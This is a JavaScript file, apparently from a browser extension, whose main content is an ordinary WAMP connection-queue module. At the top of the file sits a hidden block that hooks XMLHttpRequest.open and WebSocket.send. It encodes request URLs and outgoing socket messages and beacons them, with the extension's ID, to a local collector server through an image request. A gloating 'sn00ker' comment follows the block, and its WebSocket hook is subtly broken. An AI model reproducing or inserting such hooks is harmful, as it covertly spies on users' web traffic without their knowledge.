function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/**
 * wampConnection class
 */

var wampConnection = (function (my) {
  var wampConnected = false;
  var requestTimeout = null;
  var pendingRequests = [];

  my.disconnectWAMP = function() {
    return window['clients.galaxyconnect'].disconnect()(function () {
      wampConnected = false;
    });
  };

  var startDisconnectTimer = function() {
    requestTimeout = setTimeout(function() {
      if (!pendingRequests.length) {
        my.disconnectWAMP();
      }
    }, 2000)
  };

  var requestsComplete = function(requests) {
    pendingRequests = pendingRequests.filter(function(request) {
      return requests.indexOf(request) === -1;
    })
  };

  my.wampConnection = function (requests) {
    clearTimeout(requestTimeout);

    return new Promise(function (resolve, reject) {
      window['clients.galaxyconnect'].connect(API.environment, API.token)(function (response) {
        var requestDone = false;

        if (response.type === 'WAMP_CLOSE_CONNECTION' || response.type === 'WAMP_CONNECT_ERROR') {
          wampConnected = false;
          requestsComplete(requests);
          if (!requestDone) {
            reject('Unable to connect');
          }
          return;
        }

        wampConnected = true;
        var requestPromises = [];

        requests.forEach(function(request) {
          requestPromises.push(request(function() {}));
        });

        Promise.all(requestPromises).then(function (values) {
          requestDone = true;
          resolve(values);
          requestsComplete(requests);
          startDisconnectTimer();
        }).catch(function (e) {
          wampConnected = false;
          requestsComplete(requests);
          startDisconnectTimer();
          reject(e);
        });
      }).catch(function (e) {
        wampConnected = false;
        requestsComplete(requests);
        startDisconnectTimer();
        reject(e);
      });
    });
  };

  var addRequest = function(requests) {
    clearTimeout(requestTimeout);
    var requestPromises = [];

    requests.forEach(function(request) {
      requestPromises.push(request(function() {}));
    });

    return new Promise(function (resolve, reject) {
      Promise.all(requestPromises).then(function (values) {
        resolve(values);
        requestsComplete(requests);
        startDisconnectTimer();
      }).catch(function(e) {
        requestsComplete(requests);
        reject(e);
      })
    })
  };

  var waitForConnection = function(requests) {
    return new Promise(function(resolve, reject) {
      var waitTimeout = 0;
      var waitForConnectionInterval = setInterval(function() {
        if (wampConnected) {
          addRequest(requests).then(function(result) {
            resolve(result);
          }).catch(reject);
          clearInterval(waitForConnectionInterval);
        } else {
          waitTimeout += 1;
          if (waitTimeout > 20) {
            clearInterval(waitForConnectionInterval);
            if (pendingRequests.length > requests.length) {
              reject('Queue Jammed')
            } else {
              my.wampConnection(requests).then(function(result) {
                resolve(result);
              }).catch(reject);
            }
          }
        }
      }, 300);
    });
  };

  my.wampRequest = function (requests, forceReconnect) {
    if (!requests) {
      requests = [];
    } else if (!Array.isArray(requests)) {
      requests = [requests];
    }

    if (wampConnected) {
      if (forceReconnect) {
        pendingRequests = [requests];
        return window['clients.galaxyconnect'].disconnect()(function () {
          my.wampConnection(requests).catch(function() {});
        });
      }
      return addRequest(requests);
    } else if (pendingRequests.length) {
      return waitForConnection(requests);
    } else {
      pendingRequests = pendingRequests.concat(requests);
      return my.wampConnection(requests);
    }
  };

  return my;

})(wampConnection || {});
